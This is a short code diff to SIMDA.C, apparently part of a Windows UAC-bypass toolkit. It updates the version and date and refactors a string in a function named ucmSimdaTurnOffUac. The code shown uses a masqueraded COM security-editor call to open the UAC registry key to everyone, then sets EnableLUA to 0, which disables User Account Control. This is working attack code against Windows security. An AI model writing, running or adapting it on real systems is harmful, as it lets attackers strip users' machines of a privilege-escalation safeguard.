@@ -4,9 +4,9 @@
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     2.87
+*  VERSION:     2.89
 *
-*  DATE:        19 Jan 2018
+*  DATE:        14 Jun 2018
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -127,6 +127,8 @@ BOOL ucmSimdaTurnOffUac(
     UNICODE_STRING      ustr;
     OBJECT_ATTRIBUTES   obja;
 
+    STATIC_UNICODE_STRING(usEnableLua, L"EnableLUA");
+
     bResult = ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
         DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE);
 
@@ -140,11 +142,10 @@ BOOL ucmSimdaTurnOffUac(
         InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
         if (NT_SUCCESS(NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja))) {
 
-            dwValue = 0;
-            RtlInitUnicodeString(&ustr, L"EnableLUA");
+            dwValue = 0;            
             bResult = NT_SUCCESS(NtSetValueKey(
                 hKey,
-                &ustr,
+                &usEnableLua,
                 0,
                 REG_DWORD,
                 (PVOID)&dwValue,
